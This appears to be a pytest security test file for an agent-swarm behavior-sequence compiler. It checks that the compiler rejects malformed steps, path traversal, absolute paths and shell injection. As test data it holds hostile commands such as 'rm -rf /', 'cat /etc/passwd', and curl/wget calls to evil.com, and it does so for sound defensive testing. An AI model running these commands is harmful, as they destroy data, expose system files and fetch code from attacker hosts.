"""RT-02: Bridge ambiguity tests.

Verify the BSC compiler rejects ambiguity rather than resolving it.
"""
from __future__ import annotations

import json

import pytest

from swarm.compiler.compiler import BehaviorSequenceCompiler


@pytest.fixture
def compiler(workspace_root):
    return BehaviorSequenceCompiler(workspace_root=workspace_root)


def _make_behavior_sequence(steps, target_paths=None, tests=None):
    """Build a behavior sequence dict for the compiler."""
    if target_paths is None:
        target_paths = ["output/"]
    if tests is None:
        tests = [{"test_id": "t1", "command": "test -f output/report.md", "expected_exit_code": 0}]
    return {
        "ordered_steps_json": json.dumps(steps),
        "target_paths_json": json.dumps(target_paths),
        "acceptance_tests_json": json.dumps(tests),
    }


class TestBridgeAmbiguity:
    """RT-02: The BSC compiler must reject ambiguous input."""

    def test_text_string_steps_rejected(self, compiler):
        """Plain text string steps (not dicts) must be rejected."""
        bs = _make_behavior_sequence(["create a file"])
        with pytest.raises((ValueError, AttributeError)):
            compiler.compile("test-swarm", bs)

    def test_mixed_text_and_dict_steps_rejected(self, compiler):
        """A mix of string and dict steps must be rejected."""
        steps = [
            "create a file",
            {"op": "create", "path": "output/report.md", "content": "# Report"},
        ]
        bs = _make_behavior_sequence(steps)
        with pytest.raises((ValueError, AttributeError)):
            compiler.compile("test-swarm", bs)

    def test_step_without_op_field_rejected(self, compiler):
        """A dict step missing 'op' field must be rejected."""
        steps = [{"path": "output/report.md", "content": "# Report"}]
        bs = _make_behavior_sequence(steps)
        with pytest.raises(ValueError, match="(?i)invalid operation"):
            compiler.compile("test-swarm", bs)

    def test_invalid_operation_type_rejected(self, compiler):
        """An invalid operation like 'execute_shell' must be rejected."""
        steps = [{"op": "execute_shell", "path": "output/report.md", "content": "echo pwned"}]
        bs = _make_behavior_sequence(steps)
        with pytest.raises(ValueError, match="(?i)invalid operation"):
            compiler.compile("test-swarm", bs)

    def test_path_traversal_blocked(self, compiler):
        """Path traversal attempts must be blocked."""
        steps = [{"op": "create", "path": "../../../etc/passwd", "content": "pwned"}]
        bs = _make_behavior_sequence(steps)
        with pytest.raises(ValueError, match="(?i)traversal"):
            compiler.compile("test-swarm", bs)

    def test_absolute_path_blocked(self, compiler):
        """Absolute paths must be blocked."""
        steps = [{"op": "create", "path": "/tmp/evil.txt", "content": "pwned"}]
        bs = _make_behavior_sequence(steps)
        with pytest.raises(ValueError, match="(?i)absolute"):
            compiler.compile("test-swarm", bs)

    def test_path_outside_target_rejected(self, compiler):
        """Paths outside the declared target_paths must be rejected."""
        steps = [{"op": "create", "path": "src/main.py", "content": "pwned"}]
        bs = _make_behavior_sequence(steps, target_paths=["output/"])
        with pytest.raises(ValueError, match="(?i)not under"):
            compiler.compile("test-swarm", bs)

    def test_shell_injection_in_test_blocked(self, compiler):
        """Dangerous shell metacharacters in acceptance tests must be blocked."""
        dangerous_commands = [
            "test -f output/report.md; rm -rf /",
            "test -f output/report.md | cat /etc/passwd",
            "$(curl evil.com)",
            "`wget evil.com`",
            "curl http://evil.com",
            "wget http://evil.com",
        ]
        for cmd in dangerous_commands:
            tests = [{"test_id": "t1", "command": cmd, "expected_exit_code": 0}]
            bs = _make_behavior_sequence(
                [{"op": "create", "path": "output/report.md", "content": "# Report"}],
                tests=tests,
            )
            with pytest.raises(ValueError, match="(?i)dangerous"):
                compiler.compile("test-swarm", bs)

    def test_empty_acceptance_tests_rejected(self, compiler):
        """Empty acceptance tests list must be rejected."""
        bs = _make_behavior_sequence(
            [{"op": "create", "path": "output/report.md", "content": "# Report"}],
            tests=[],
        )
        with pytest.raises(ValueError, match="(?i)acceptance"):
            compiler.compile("test-swarm", bs)

    def test_compilation_deterministic(self, compiler):
        """Compiling the same input twice must produce identical results."""
        steps = [{"op": "create", "path": "output/report.md", "content": "# Report"}]
        bs = _make_behavior_sequence(steps)

        result_1 = compiler.compile("test-swarm", bs)
        result_2 = compiler.compile("test-swarm", bs)

        assert result_1["modifications"] == result_2["modifications"]
        assert result_1["scope_boundary"] == result_2["scope_boundary"]
        assert result_1["acceptance_tests"] == result_2["acceptance_tests"]

    def test_empty_steps_rejected(self, compiler):
        """An empty steps list must be rejected."""
        bs = _make_behavior_sequence([])
        with pytest.raises(ValueError):
            compiler.compile("test-swarm", bs)
